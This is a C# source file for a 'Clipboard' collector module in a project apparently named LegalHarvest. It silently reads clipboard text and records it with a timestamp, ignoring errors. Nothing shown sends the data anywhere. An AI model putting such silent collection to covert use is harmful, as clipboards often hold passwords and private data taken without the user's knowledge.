using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace LegalHarvest.Modules
{
    public class ClipboardContentModule : ICollectorModule
    {
        public string ModuleName => "Clipboard";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            try
            {
                if (Clipboard.ContainsText())
                {
                    string text = Clipboard.GetText();
                    if (!string.IsNullOrEmpty(text))
                        items.Add(new CollectedItem { Category = "Clipboard", Name = "Text", Value = text, Timestamp = DateTime.Now });
                }
            }
            catch { }
            return items;
        }
    }
}
